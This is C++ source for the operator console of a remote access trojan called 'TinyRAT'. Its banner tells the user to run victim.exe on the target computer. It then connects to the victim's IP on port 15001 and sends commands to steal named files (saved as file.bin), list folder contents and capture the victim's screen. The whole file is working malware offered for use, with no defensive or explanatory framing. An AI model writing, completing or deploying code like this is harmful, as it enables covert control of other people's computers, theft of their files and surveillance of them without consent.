#include <winsock2.h>
#include <stdio.h>
#include <WS2tcpip.h>
#include <fstream>
#pragma comment(lib,"ws2_32.lib")
#define PORT 15001
#define BUFFER_SIZE 1024
int main()
{
    SetConsoleTitle("TinyRAT");
    printf("Welcome to TinyRAT!\nPlease run victim.exe on the computer you want to control.\n$[filename] will steal that file and the file will be saved as file.bin. For example:$document.docx\n#[folder] will put the file list of that folder into list.txt(you can use $list.txt to get it).For example:#C:\n%s will capture the screen and save the screen capture as cap.png(you can use $cap.png to get it).\nCreated by Leo.\nInitializing...\n", "%");
    char buf[BUFFER_SIZE];
    int inputLen = 0;
    PSTR IP = new char[100];
    printf("VictimIP>");
    while ((IP[inputLen++] = getchar()) != '\n') {

    }
    while (true)
    {
        printf("RAT>");
        inputLen = 0;
        memset(buf, 0, sizeof(buf));
        while ((buf[inputLen++] = getchar()) != '\n') {

        }
        if (buf[0] == 'e' && buf[1] == 'x' && buf[2] == 'i' && buf[3] == 't')
        {
            printf("Exit.\n");
            break;
        }

        WSADATA WSAData;
        if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)
        {
            printf("Socket initialize failed!\n");
            continue;
        }
        SOCKET sock;
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
        {
            printf("Socket create failed!\n");
            WSACleanup();
            continue;
        }

        struct sockaddr_in VictimAddr;
        VictimAddr.sin_family = AF_INET;
        VictimAddr.sin_port = htons(PORT);
        inet_pton(AF_INET, IP, &VictimAddr.sin_addr);
        if (connect(sock, (LPSOCKADDR)&VictimAddr, sizeof(VictimAddr)) == SOCKET_ERROR)
        {
            printf("Connect failed!\n");
            closesocket(sock);
            WSACleanup();
            continue;
        }
        send(sock, buf, BUFFER_SIZE, 0);

        if (buf[0] == '$') {
            FILE* fp;
            fopen_s(&fp, "file.bin", "wb");
            if (NULL != fp)
            {
                memset(buf, 0, BUFFER_SIZE);
                int length = 0;
                while ((length = recv(sock, buf, BUFFER_SIZE, 0)) > 0)
                {
                    if (fwrite(buf, sizeof(char), length, fp) < length)
                    {
                        break;
                    }
                    memset(buf, 0, BUFFER_SIZE);
                }

                fclose(fp);
            }
        }

        closesocket(sock);
        WSACleanup();
    }
    return 0;
}